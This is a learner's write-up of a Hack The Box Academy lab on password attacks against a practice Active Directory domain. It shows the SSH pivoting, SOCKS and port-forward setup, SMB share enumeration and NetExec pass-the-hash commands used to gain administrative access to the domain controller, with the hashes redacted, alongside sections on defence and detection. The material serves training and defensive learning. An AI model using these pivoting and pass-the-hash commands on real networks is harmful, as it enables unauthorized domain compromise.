# HTB Academy — Password Attacks Skills Assessment: NEXURA Domain

**Platform:** Hack The Box Academy  
**Module:** Password Attacks  
**Learning unit:** Skills Assessment — Password Attacks  
**Date documented:** 2026-11-03  
**Target:** ACADEMY-PWATTCK-SADMZ01 (`10.129.230.32`)  
**Classification:** DOCUMENTED PRACTICE / EVIDENCE PENDING  
**Official course:** https://academy.hackthebox.com/course/preview/password-attacks

## 1. Overview

This case study documents a NEXURA Active Directory skills assessment conducted within an authorized Hack The Box Academy environment.

The immediate assessment objective was to recover the NTLM hash of the NEXURA domain Administrator.

The learner's recorded activity did not successfully complete NTDS extraction. However, it demonstrated several important practical outcomes: SSH access to the DMZ host, internal network discovery, validation of domain-controller reachability, SOCKS pivot troubleshooting, SSH local port forwarding, SMB share enumeration, and successful authentication to DC01 with privileged NTLM material.

The Administrator hash was independently confirmed in a public community write-up. This external reference result is explicitly separated from the learner's actual terminal evidence.

The assessment therefore remains classified as documented practice with pending evidence rather than a fully verified domain-compromise exercise.

## 2. Learning Objectives

- Understand the relationship between a DMZ entry point and an internal Active Directory environment.
- Identify internal interfaces, routing information, and domain-controller DNS records.
- Configure SSH dynamic forwarding and SOCKS-based pivoting.
- Understand the differences between TCP connectivity, SMB negotiation, and successful authentication.
- Troubleshoot ProxyChains and SMB client timeouts.
- Configure SSH local port forwarding to reach an internal SMB service.
- Validate NTLM authentication using Samba SMBClient and NetExec.
- Distinguish privileged authentication from successful credential replication or NTDS extraction.
- Preserve the distinction between original evidence and third-party write-up references.

## 3. Technical Background

### Active Directory and SMB

Active Directory provides centralized authentication and authorization across Windows domain environments.

The Server Message Block protocol is commonly used for file sharing, administrative shares, and domain resources.

SMB generally operates over TCP port 445.

An open TCP port does not establish that SMB negotiation or authentication has succeeded. A complete test must progress through the protocol negotiation and authentication stages.

### NTLM Pass-the-Hash

NTLM authentication can permit the use of an account's NT hash without recovering the corresponding plaintext password.

In this assessment, NTLM material associated with the domain account `stom` was used to authenticate to the domain controller.

NetExec's `(Pwn3d!)` indicator reported administrative access for the tested SMB host.

This is a meaningful finding, but it does not independently prove that domain credentials were extracted.

### SSH Dynamic Forwarding

SSH dynamic forwarding creates a SOCKS proxy on the attack machine.

Example:

```bash
ssh -N -D 127.0.0.1:1080 jbetty@10.129.230.32
```

Compatible TCP tools may be routed through this proxy using ProxyChains.

The forwarding session must remain active.

If the SSH process terminates, the SOCKS listener disappears and dependent connections will fail.

### SSH Local Port Forwarding

SSH local forwarding maps one local TCP endpoint to one destination through the SSH server.

In the recorded exercise, the mapping was:

`Pwnbox:1445 → DMZ01 → DC01:445`

This provided a simpler way to test SMB than the earlier SOCKS-based approach.

### NTDS and Domain Credential Extraction

The AD database contains highly sensitive credential material.

DCSync attempts to obtain directory secrets through AD replication interfaces. Other NTDS extraction methods may rely on remote administration and volume-shadow-copy operations.

Successful SMB authentication alone is not sufficient evidence that either method completed.

## 4. Lab Environment

### Attack Host

- Platform: HTB Pwnbox
- Linux distribution: Parrot OS
- Observed IP address: `10.10.15.97`
- Shells encountered: PowerShell on Linux and Bash
- ProxyChains-ng: 4.17
- NetExec: 1.5.1
- Impacket: 0.12.0
- Other utilities: OpenSSH, netcat, Samba SMBClient, iproute2

### DMZ01

- Hostname: DMZ01
- Assessment identifier: ACADEMY-PWATTCK-SADMZ01
- Operating system: Ubuntu 20.04.6 LTS
- External interface: `ens160`
- External address: `10.129.230.32/16`
- Internal interface: `ens192`
- Internal address: `172.16.119.13/24`
- SSH account: `jbetty`

### Active Directory

- Domain: `NEXURA.HTB`
- Domain controller: DC01
- Domain-controller address: `172.16.119.11`
- SMB service: TCP/445
- RPC Endpoint Mapper: TCP/135
- Privileged account tested: `NEXURA\stom`

Full credentials and reusable NTLM hashes are intentionally redacted from the portfolio version.

## 5. Reconnaissance and Initial Investigation

### 5.1 Initial SSH Access

The learner authenticated to the externally reachable DMZ01 host using the SSH account supplied for the exercise.

```bash
ssh jbetty@10.129.230.32
```

The successful connection displayed an Ubuntu 20.04.6 LTS login banner and provided an interactive shell.

This established an initial authenticated position on the DMZ host.

### 5.2 Internal Interface Enumeration

The following commands were executed:

```bash
ip -br addr
ip route
```

Observed network interface information:

```text
lo      UNKNOWN  127.0.0.1/8
ens160  UP       10.129.230.32/16
ens192  UP       172.16.119.13/24
```

Observed internal route:

```text
172.16.119.0/24 dev ens192 proto kernel scope link src 172.16.119.13
```

These findings established that DMZ01 had direct connectivity to the internal network.

### 5.3 Domain Controller Resolution

The learner queried the domain controller's name:

```bash
getent hosts dc01.nexura.htb
```

Observed result:

```text
172.16.119.11 nexura.htb DC01 DC01.nexura.htb
```

The result verified the internal address of the domain controller.

### 5.4 Direct SMB Reachability

From DMZ01:

```bash
nc -vz -w 5 172.16.119.11 445
```

Observed result:

```text
Connection to 172.16.119.11 445 port [tcp/microsoft-ds] succeeded!
```

This demonstrated TCP connectivity between the DMZ server and the domain controller.

It did not yet prove successful SMB authentication.

**Evidence:** Original terminal text verified. A corresponding screenshot has not been recovered on Kali.

**Evidence Status: PENDING**

## 6. SOCKS Pivot Investigation

### 6.1 Creating the SOCKS Tunnel

The initial pivot used SSH dynamic forwarding:

```bash
ssh -N -D 127.0.0.1:1080 \
  -o ExitOnForwardFailure=yes \
  jbetty@10.129.230.32
```

ProxyChains was configured with:

```ini
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080
```

This configuration routed compatible TCP client connections through DMZ01.

### 6.2 Tunnel Termination

An SSH debug log showed successful authentication:

```text
Authenticated to 10.129.230.32 using "password".
Local forwarding listening on 127.0.0.1 port 1080.
```

However, the same session was later interrupted:

```text
^C
Killed by signal 2.
```

After termination, the SOCKS listener was no longer available.

The learner confirmed this with:

```bash
ss -lntp | grep ':1080'
nc -vz -w 3 127.0.0.1 1080
```

Observed failure:

```text
nc: connect to 127.0.0.1 port 1080 (tcp) failed: Connection refused
```

This explained one category of ProxyChains failures.

### 6.3 Restoring Forwarding

After reopening the SSH tunnel, the learner observed a listening SSH process and a successful SOCKS port check.

A later ProxyChains TCP test returned:

```text
Strict chain ... 127.0.0.1:1080 ... 172.16.119.11:445 ... OK
Connection to 172.16.119.11 445 port [tcp/microsoft-ds] succeeded!
```

At this point, basic network connectivity was restored.

**Evidence:** Authentic screenshot `image(20261102-155951).png` was supplied in the conversation.

The screenshot shows the SSH password prompt and Impacket SMB timeout.

The original screenshot is not currently present in the Kali website workspace.

**Evidence Status: PENDING**

## 7. SMB Negotiation Troubleshooting

### 7.1 NetExec via ProxyChains

The learner tested SMB authentication using NetExec.

Representative command with authentication material redacted:

```bash
proxychains4 -f "$HOME/proxychains-nexura.conf" \
  netexec smb 172.16.119.11 \
  -u stom \
  -H '<REDACTED_NT_HASH>' \
  -d NEXURA.HTB \
  --no-smbv1 \
  --smb-timeout 25 \
  --timeout 30 \
  -t 1 \
  --debug
```

Observed output included:

```text
Creating SMBv3 connection to 172.16.119.11
Timeout creating SMBv3 connection to 172.16.119.11
```

Earlier tests also reported SMBv1 connection timeouts.

The failures occurred before a successful SMB authentication response was produced.

### 7.2 Impacket Troubleshooting

The learner attempted Impacket SMB operations through ProxyChains.

An observed failure was:

```text
RemoteOperations failed:
[Errno Connection error (172.16.119.11:445)] timed out
```

The timeout did not demonstrate invalid credentials.

It demonstrated that the attempted operation failed to establish or maintain the required communication.

### 7.3 Important Interpretation

The investigation established a distinction between three conditions:

1. A working SSH forwarding process.
2. A successful TCP connection to a destination port.
3. A successfully negotiated and authenticated SMB session.

These are separate outcomes.

A successful netcat port check must not be reported as successful SMB authentication.

**Evidence:** Authentic screenshot `image(20261102-160645).png` was supplied in the conversation.

The screenshot records a successful SOCKS TCP test and an unsuccessful Impacket operation.

The source screenshot has not been transferred into the Kali website workspace.

**Evidence Status: PENDING**

## 8. Successful SMB Access Through SSH Local Forwarding

### 8.1 Dedicated Port Forward

The learner configured a dedicated SSH local port forward:

```bash
ssh -N \
  -L 127.0.0.1:1445:172.16.119.11:445 \
  -o ExitOnForwardFailure=yes \
  jbetty@10.129.230.32
```

This created the following communication path:

```text
HTB Pwnbox
    |
    | 127.0.0.1:1445
    v
SSH Tunnel
    |
    v
DMZ01 (10.129.230.32)
    |
    v
DC01 (172.16.119.11:445)
```

### 8.2 Verifying the Forwarded Port

The learner ran:

```bash
nc -vz -w 5 127.0.0.1 1445
```

Observed result:

```text
Connection to 127.0.0.1 1445 port [tcp/*] succeeded!
```

This verified that the forwarded TCP endpoint was accessible.

### 8.3 Samba SMBClient Authentication

The learner tested SMB access through local port 1445:

```bash
smbclient -L //127.0.0.1 \
  -p 1445 \
  -W NEXURA \
  -U 'stom%<REDACTED_NT_HASH>' \
  --pw-nt-hash \
  -m SMB3 \
  -t 20
```

Observed share enumeration:

```text
Sharename   Type   Comment
---------   ----   ------------------
ADMIN$      Disk   Remote Admin
C$          Disk   Default share
IPC$        IPC    Remote IPC
NETLOGON    Disk   Logon server share
SYSVOL      Disk   Logon server share
```

The client also reported:

```text
SMB1 disabled -- no workgroup available
```

This was not an authentication failure.

The listed shares demonstrate that the SMB client completed negotiation and authentication sufficiently to enumerate the available resources.

### 8.4 Privileged Authentication With NetExec

Next, the learner ran NetExec directly against the forwarded endpoint:

```bash
netexec smb 127.0.0.1 \
  --port 1445 \
  -u stom \
  -H '<REDACTED_NT_HASH>' \
  -d NEXURA.HTB \
  --no-smbv1 \
  --smb-timeout 20 \
  -t 1
```

Observed host information:

```text
SMB 127.0.0.1 1445 DC01
Windows 10 / Server 2019 Build 17763
name: DC01
domain: nexura.htb
signing: True
```

Observed authentication result:

```text
[+] NEXURA.HTB\stom:<REDACTED> (Pwn3d!)
```

This was the strongest verified technical result in the exercise.

The result demonstrates successful NTLM authentication and NetExec's administrative-access indication on DC01.

It does not demonstrate that NTDS extraction was completed.

**Evidence:** Authentic terminal output was supplied directly in the conversation.

A screenshot showing the successful `(Pwn3d!)` result was not supplied.

**Evidence Status: PENDING**

## 9. Assessment Question: Domain Administrator NTLM

### Objective

The question required the NTLM hash belonging to:

`NEXURA\Administrator`

The learner attempted to recover this value using NTDS-related operations.

An Impacket approach using `-just-dc-user Administrator` did not succeed in the recorded session because of connection timeouts.

### Independent Reference Verification

A separate public write-up by `jameskaois` contains an NTDS extraction result for the domain Administrator account.

The referenced account has RID 500.

The full NTLM hash was checked against that write-up in this conversation.

For the public portfolio report, the reusable hash is represented in redacted form:

```text
Administrator:500:<LM_HASH>:36e09e1e...b8d6d23:::
```

This is a source-supported reference result, not a locally observed extraction.

It is also distinct from the local Administrator hash associated with JUMP01.

### Verification Boundary

No supplied terminal output shows a completed NTDS dump on the learner's current instance.

No screenshot establishes that the Administrator hash was extracted locally.

No accepted HTB answer submission was supplied.

Therefore, completion of the NTDS extraction objective remains unverified.

## 10. Results and Verification

### Verified Outcomes

- SSH authentication to DMZ01 succeeded.
- DMZ01's internal interface was identified.
- Internal network routing was confirmed.
- DC01 resolved to `172.16.119.11`.
- DMZ01 reached DC01 on TCP/445.
- SOCKS forwarding behavior was investigated.
- The terminated SSH tunnel was identified as one cause of failure.
- SSH local port forwarding was established.
- The forwarded SMB service responded.
- Samba SMBClient enumerated DC01 shares.
- NetExec authenticated the privileged domain account and reported `(Pwn3d!)`.

### Outcomes Not Verified Locally

- Successful extraction of the domain Administrator hash.
- Successful replication of AD credential material.
- Completed NTDS dumping.
- Full compromise of every host in the assessment.
- Official acceptance of the submitted answer.

### Evidence Requirements

The original conversation includes two screenshots of networking and SMB troubleshooting.

They have not been copied into the Kali website evidence directory.

The successful administrative SMB authentication is supported by real terminal output, but no screenshot of that final result is available.

The report must retain the classification `EVIDENCE PENDING` until the evidence requirements are satisfied.

## 11. Security Implications

### DMZ-to-Internal Access

DMZ01 had a network interface directly connected to the internal domain subnet.

An authenticated operator on that host could reach the internal domain controller.

This illustrates why multihomed systems should be carefully assessed when defining trust boundaries.

### Reusable Authentication Material

The successful use of an NT hash to authenticate demonstrates the security significance of exposed credential material.

An attacker does not always need a plaintext password to authenticate to an NTLM-enabled service.

### Privileged Domain Access

NetExec identified administrative access for the tested domain account.

Accounts with extensive administrative privileges present a significant risk when their credentials are exposed.

### Reporting Accuracy

Successful authentication to a domain controller and successful extraction of directory secrets are distinct findings.

A professional assessment must not report the latter solely because the former succeeded.

## 12. Defensive Perspective

### Network Segmentation

Restrict unnecessary connections from DMZ hosts to domain controllers.

Apply host firewall rules and service-specific network access controls.

### Privileged Account Protection

Limit standing domain-administrator privileges.

Use dedicated administrative accounts and enforce appropriate separation between user and privileged sessions.

Avoid exposing highly privileged reusable authentication material on shared systems.

### Monitoring Opportunities

Potentially relevant Windows security events include:

- Event 4624: successful logon, including network logons.
- Event 4672: special privileges assigned to a new logon.
- Event 4662: directory-service object access, useful for investigating replication activity when appropriate auditing is configured.

Investigators should correlate host, account, source address, privileges, and activity timelines rather than interpreting a single event as proof of compromise.

### Credential Access Detection

Monitor unusual access to LSASS memory.

Investigate unexpected credential extraction utilities and privileged authentication patterns.

Monitor directory replication operations and suspicious administrative activity against domain controllers.

### SMB Security

Maintain supported SMB versions and enforce suitable authentication and integrity protections.

SMB signing protects message integrity but does not automatically prevent the use of valid stolen credentials.

## 13. Lessons Learned

The central troubleshooting lesson was that TCP reachability, protocol negotiation, and authentication must be tested separately.

The initial SOCKS failures included a terminated SSH session and later SMB-level timeouts.

Examining the listening process confirmed whether forwarding was active.

Testing the internal network from DMZ01 ruled out an incorrect domain-controller address.

Using SSH local port forwarding reduced the number of moving parts and enabled the learner to obtain a reliable SMB authentication result.

The reporting lesson was equally important: independent public references can corroborate a lab solution, but they must not replace authentic evidence of the learner's own actions.

## 14. References

- HTB Academy — Password Attacks: https://academy.hackthebox.com/course/preview/password-attacks
- jameskaois — Skills Assessment, Password Attacks: https://github.com/jameskaois/ctf-writeups/blob/main/cpts/10-password-attacks/26-skills-assessment-password-attacks.md
- MITRE ATT&CK T1003.001 — LSASS Memory: https://attack.mitre.org/techniques/T1003/001/
- MITRE ATT&CK T1003.006 — DCSync: https://attack.mitre.org/techniques/T1003/006/
- MITRE ATT&CK T1552.001 — Credentials in Files: https://attack.mitre.org/techniques/T1552/001/
